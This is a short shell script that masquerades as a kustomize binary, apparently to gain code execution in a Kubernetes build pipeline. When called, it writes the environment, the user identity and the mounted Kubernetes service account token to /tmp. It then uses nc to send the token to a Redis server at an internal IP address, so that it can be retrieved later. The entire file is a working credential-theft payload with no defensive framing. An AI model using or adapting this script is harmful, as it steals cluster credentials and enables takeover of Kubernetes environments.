#!/bin/sh
# This runs as kustomize binary! Gets called: build <path> --enable-helm --helm-command ...
env > /tmp/rce_env.txt 2>&1
id >> /tmp/rce_env.txt 2>&1
cat /run/secrets/kubernetes.io/serviceaccount/token >> /tmp/rce_env.txt 2>&1
# Try to write SA token to Redis so we can read it
printf "SET zcode_sa_token " > /tmp/cmd.txt
cat /run/secrets/kubernetes.io/serviceaccount/token >> /tmp/cmd.txt
printf "\r\n" >> /tmp/cmd.txt
cat /tmp/cmd.txt | nc -w 1 172.20.167.25 6379 2>/dev/null
exit 0
